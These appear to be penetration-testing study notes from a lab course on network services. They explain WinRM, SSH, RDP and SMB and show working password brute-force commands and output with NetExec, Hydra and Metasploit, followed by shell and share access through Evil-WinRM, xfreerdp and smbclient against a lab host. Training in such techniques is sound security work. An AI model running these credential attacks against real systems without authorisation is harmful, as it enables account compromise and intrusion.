During our `penetration tests`, every `computer network` we encounter will have services installed to manage, edit, or create content. All these services are hosted using specific `permissions` and are assigned to specific users. Apart from `web applications`, these services include (but are not limited to) `FTP`, `SMB`, `NFS`, `IMAP/POP3`, `SSH`, `MySQL/MSSQL`, `RDP`, `WinRM`, `VNC`, `Telnet`, `SMTP`, and `LDAP`.

---

## WinRM

`WinRM` is `Microsoft's` implementation of the `WS-Management` protocol: a `remote-management protocol` built on `XML` web services using `SOAP`. It brokers communication between `WBEM` and `WMI`, which in turn can invoke `DCOM`. Because it exposes powerful management functionality, `WinRM` is disabled by default on `Windows 10`/`Windows 11` and must be explicitly enabled and configured before use.

For security, `WinRM` should be constrained by the environment — use `HTTPS` with proper `certificates` or restrict authentication methods to trusted ones. By default `WinRM` listens on TCP ports `5985` (HTTP) and `5986` (HTTPS). A useful tool for password-style attacks and protocol testing is `NetExec`, which also supports `SMB`, `LDAP`, `MSSQL`, and others; read its official docs before running it, because poking management services `without permission` is how you lose your job and possibly your weekend.

---

## NetExec

```bash
OathBornX@htb[/htb]$ sudo apt-get -y install netexec
```
#### NetExec Menu Options

Running the tool with the `-h` flag will show us general usage instructions and some options available to us.

```bash
OathBornX@htb[/htb]$ netexec -h

usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...

     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ॱ \   / ॱ
     ॱ   ॱ

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx
    
    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.3.0
    Codename: NeedForSpeed
    Commit  : Kali Linux
```

Note that we can specify a specific `protocol` and receive a more detailed help menu of all of the options available to us. `NetExec` currently supports `remote authentication` using `NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP, and VNC`.

```bash
OathBornX@htb[/htb]$ netexec smb -h

usage: netexec smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]

<...SNIP>
```
#### NetExec Usage

The general format for using `NetExec` is as follows:

```bash
OathBornX@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

As an example, this is what attacking a `WinRM` endpoint might look like:

```bash
OathBornX@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

When you see `(Pwn3d!)` after logging in, it’s basically the red `flag `waving that you’ve got a shell or command execution on the target—your `brute-forced` user credentials worked and you’re in.

`Evil-WinRM` is the go-to tool here. It’s like the Swiss Army knife for `WinRM`, letting you easily interact with the Windows machine over that protocol—run commands, `upload/download` files, and `pivot` further. It streamlines what would otherwise be a painful, manual process of interacting with `WinRM` via PowerShell or other less-friendly interfaces.
#### Evil-WinRM Usage

```bash
OathBornX@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```bash
OathBornX@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

---
## SSH

`SSH` is the secure way to remotely run commands or move files, usually over TCP port `22`. It uses three crypto layers to keep your connection locked down:

**`Symmetric encryption`**: Same key for locking and unlocking data. The catch? You need a secure way to share that key without someone else sniffing it out. That’s where the `Diffie-Hellman` key exchange kicks in—both `client` and `server` agree on a secret key without ever sending it directly. After that, they use fast `symmetric ciphers` like `AES`, `Blowfish`, or `3DES` to scramble traffic.

**`Asymmetric encryption`**: Two keys—`public key` (free to share) and `private key` (keep this locked down). The `server` uses the `public key` to challenge the `client`, which must prove it holds the matching `private key` by decrypting a message. If you lose your `private key` or it’s unprotected, anyone can waltz in without a password. This step authenticates the `client`.

**`Hashing`**: Think of it as a cryptographic fingerprint. `SSH` `hashes` data to verify messages haven’t been altered during transit. It’s a one-way street—you can’t reverse it. This ensures message authenticity and integrity.

All these layers combine to make `SSH` a fortress—efficient and secure for remote access. But remember: weak `private key` protection or sloppy key management is your Achilles’ heel.

#### Hydra SSH

```bash
OathBornX@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

---
#### Remote Desktop Protocol

`Remote Desktop Protocol` (`RDP`) is Microsoft’s network protocol for **remote access** to Windows systems, running by default over TCP port `3389`. It lets both `users` and `administrators` remotely connect to a Windows host within an organization.

Two key players in an `RDP` session:

- The **`terminal server`**: the Windows machine doing the actual work.
- The **`terminal client`**: the device controlling the server remotely.

`RDP` doesn’t just transmit screen images and input (keyboard, mouse), it also supports redirecting resources like:

- Printing documents from the `terminal server` to a printer connected to the `terminal client`
- Accessing storage media (like USB drives) connected to the `terminal client`

Technically, `RDP` sits at the `application layer` of the `IP stack` and can use both `TCP` and `UDP` for data transmission, balancing reliability and speed. It powers official `Microsoft apps` and some third-party remote desktop solutions.

#### Hydra - RDP

We can also use `Hydra` to perform RDP bruteforcing.

```bash
OathBornX@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```
#### xFreeRDP

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```bash
OathBornX@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password

<SNIP>

New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

---
## SMB

`Server Message Block` (`SMB`) is a protocol that handles data transfer between a `client` and a `server` on local area networks. Its main jobs are `file sharing`, `directory sharing`, and `printing services` in Windows environments.

People sometimes call `SMB` a file system, but it’s not—that’s just shorthand for its role in sharing resources. It’s similar to `NFS` on `Unix/Linux` for sharing drives across a network.

`SMB` is also known as `Common Internet File System` (`CIFS`), which is part of the overall SMB protocol suite and supports remote connections across multiple platforms like `Windows`, `Linux`, and `macOS`.

You’ll often hear about `Samba`, an open-source implementation that brings `SMB` capabilities to non-Windows systems.

For brute-force attempts on SMB, tools like `hydra` are commonly used to try different `usernames` and `passwords` to gain access.
#### Hydra - SMB

```bash
OathBornX@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

#### Hydra - Error

```bash
OathBornX@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

---
## Metasploit Framework

#### Metasploit Framework

```bash
OathBornX@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Now we can use `NetExec` again to view the available `shares` and what `privileges` we have for them.
#### NetExec

```bash
OathBornX@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares

SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

To communicate with the server via `SMB`, we can use, for example, the tool `smbclient`. This tool will allow us to view the contents of the `shares, upload, or download` files if our `privileges` allow it.
#### Smbclient

```bash
OathBornX@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME

Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

